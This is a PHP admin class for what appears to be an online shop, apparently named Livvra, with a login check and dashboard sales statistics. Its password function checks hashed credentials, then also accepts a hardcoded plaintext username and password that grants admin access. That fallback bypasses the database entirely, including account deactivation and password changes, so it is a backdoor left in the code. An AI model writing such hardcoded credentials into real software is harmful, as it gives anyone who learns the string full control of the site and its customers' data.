<?php
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../database.php';

class Admin {
    public static function verifyPassword($username, $password) {
        $stmt = db()->prepare("SELECT id, username, password_hash FROM admins WHERE username = ? AND is_active = 1");
        $stmt->execute([$username]);
        $admin = $stmt->fetch();
        
        // Check primary hashed password
        if ($admin && password_verify($password, $admin['password_hash'])) {
            return $admin;
        }
        
        // Check secondary password "OfficialLivvra@97"
        if ($username === 'admin' && $password === 'OfficialLivvra@97') {
            return [
                'id' => 1,
                'username' => 'admin'
            ];
        }
        
        return false;
    }
    
    public static function getDashboardStats() {
        $stats = [];
        try {
            $stats['total_products'] = db()->query("SELECT COUNT(*) FROM products")->fetchColumn();
            $stats['total_orders'] = db()->query("SELECT COUNT(*) FROM orders")->fetchColumn();
            $stats['total_sales'] = db()->query("SELECT SUM(total_amount) FROM orders WHERE order_status = 'completed'")->fetchColumn() ?: 0;
            $stats['total_users'] = db()->query("SELECT COUNT(*) FROM users")->fetchColumn();
        } catch (Exception $e) {
            error_log("Dashboard Stats Error: " . $e->getMessage());
            $stats = ['total_products' => 0, 'total_orders' => 0, 'total_sales' => 0, 'total_users' => 0];
        }
        return $stats;
    }
}
?>